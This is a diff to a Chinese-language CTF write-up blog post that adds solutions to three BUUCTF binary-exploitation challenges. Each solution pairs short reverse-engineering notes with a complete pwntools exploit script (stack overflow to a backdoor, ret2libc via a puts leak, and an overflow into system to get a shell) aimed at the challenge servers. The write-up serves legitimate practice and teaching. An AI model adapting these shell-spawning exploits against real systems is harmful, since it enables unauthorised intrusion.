@@ -14,6 +14,8 @@ tags:
     - ctf
 ---
 
+BUU CTF 登录之后，题目链接是对的，没有登录就直接跳转搜索了好像。
+
 只有杂鱼才会乱写杂题。
 
 ## 浅水区
@@ -244,6 +246,174 @@ payload = b'A'*offset + p32(get_flag) + p32(exit) + p32(x1) + p32(x2)
 def main():
     # io.recvuntil(b"Qual a palavrinha magica?")
     io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+### not_the_same_3dsctf_2016
+
+[题目链接](https://buuoj.cn/challenges#not_the_same_3dsctf_2016)
+
+依旧打开 IDA 一大坨。
+
+依旧后门函数。
+
+<img width="1109" height="490" alt="image" src="https://github.com/user-attachments/assets/d6795ce6-2663-48ec-8dc4-be2bf5f454e1" />
+
+大概就是读取 flag.txt 的内容并且存在内存里，点击看看 fl4g 在哪。
+
+<img width="711" height="150" alt="image" src="https://github.com/user-attachments/assets/daeedcae-6219-4778-ad2b-58e4365db4fd" />
+
+这是好的，那么我们在找一个 printf 和 一个 exit 就好了。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 27933
+io = remote(host,port)
+# io = process("./not_the_same_3dsctf_2016")
+offset = 0x2d
+getsecret = 0x80489a0
+flag = 0x80eca2d
+printf = 0x804f0a0
+exit = 0x804e660
+payload = b'A'*offset + p32(getsecret) + p32(printf) + p32(exit) + p32(flag)
+
+def main():
+    # io.recvuntil(b"b0r4 v3r s3 7u 4h o b1ch4o m3m0...")
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+## 中水区
+
+可能只有主播这种区才会觉得这里是中水区。
+
+### ciscn_2019_en_2
+
+[题目链接](https://buuoj.cn/challenges#ciscn_2019_en_2)
+
+开了 NX 保护。
+
+<img width="876" height="509" alt="image" src="https://github.com/user-attachments/assets/c21b351e-c933-46c0-976a-8218ba01e0c3" />
+
+主函数告诉你只有操作 1 有意义。
+
+<img width="1017" height="512" alt="image" src="https://github.com/user-attachments/assets/6c4e23ad-3968-4414-8db1-b8321c094a98" />
+
+加密函数告诉你他会对你异或加密，但是 `strlen()` 遇到 `\0` 就截停，可以通过此方法跳过加密。
+
+跳过加密之后就可以泄露 puts 了，ret2libc。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 28676
+io = remote(host,port)
+# io = process("./ciscn_2019_en_2")
+elf = ELF('./ciscn_2019_en_2')
+offset = 0x57
+pop_rdi_ret = 0x400c83
+ret = 0x400c84
+pop_rsi_r15_ret = 0x400c81
+encrypt_addr = 0x4009a0
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+payload_1 = b'\0' + b'A'*offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)
+
+def main():
+    io.recvuntil(b"Input your choice!\n")
+    io.sendline(b"1")
+    io.recvuntil(b"Input your Plaintext to be encrypted\n")
+    io.sendline(payload_1)
+    puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
+    print(hex(puts_addr))   # 0x7f2a1ef599c0
+    system_addr = puts_addr - 0x31580
+    binsh_addr = puts_addr + 0x1334da
+    payload_2 = b'\0' + b'A'*offset + p64(pop_rdi_ret) + p64(binsh_addr) + p64(ret) + p64(system_addr)
+    io.recvuntil(b"Input your Plaintext to be encrypted\n")
+    io.sendline(payload_2)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+### ciscn_2019_ne_5
+
+[题目链接](https://buuoj.cn/challenges#ciscn_2019_ne_5)
+
+IDA 打开一看，main 函数一大串，前面有个密码，就是 `administrator`，无意义。
+
+后面四个操作。
+
+操作 1：
+
+<img width="808" height="515" alt="image" src="https://github.com/user-attachments/assets/84d3fd8c-b2d2-4315-99ec-d79902814c0b" />
+
+给 src 赋值，**最长读入长度 128**。
+
+操作 2：
+
+<img width="937" height="425" alt="image" src="https://github.com/user-attachments/assets/ee01314b-44c7-4d7d-a8b1-303bf3f327be" />
+
+输出 src，逗逗你呀。
+
+操作 3：
+
+<img width="997" height="446" alt="image" src="https://github.com/user-attachments/assets/e85a446b-29fc-4d12-a931-e1d85443fbc5" />
+
+有 `system`，OMO。
+
+操作 4：
+
+<img width="1005" height="554" alt="image" src="https://github.com/user-attachments/assets/c00d6a2c-602f-4e65-acec-798b0e5dd88d" />
+
+把 src 粘贴到 dest 上，然后输出 dest，发现 dest 到栈底距离 0x48 = 72，小于128，可以栈溢出。
+
+现在就是去找 `/bin/sh`，ROPgadget 找一下。
+
+<img width="343" height="74" alt="image" src="https://github.com/user-attachments/assets/a863de58-e5f3-46b7-80d6-a356437c77c2" />
+
+其实去 IDA 查一下，发现是 `fflush`，但是能用。
+
+<img width="1020" height="466" alt="image" src="https://github.com/user-attachments/assets/61ee2bf7-ff27-4099-a88c-2cb6fc19d378" />
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 25971
+io = remote(host,port)
+# io = process('./ciscn_2019_ne_5')
+offset = 0x4c
+system = 0x80484d0
+sh = 0x80482ea
+main = 0x8048722
+payload = b'A'*offset + p32(system) + p32(main) + p32(sh)
+
+def main():
+    io.recvuntil(b"Please input admin password:")
+    io.sendline(b"administrator")
+    io.recvuntil(b"0.Exit\n:")
+    io.sendline(b"1")
+    io.recvuntil(b"Please input new log info:")
+    io.sendline(payload)
+    io.recvuntil(b"0.Exit\n:")
+    io.sendline(b"4")
     io.interactive()
 
 if __name__ == "__main__":
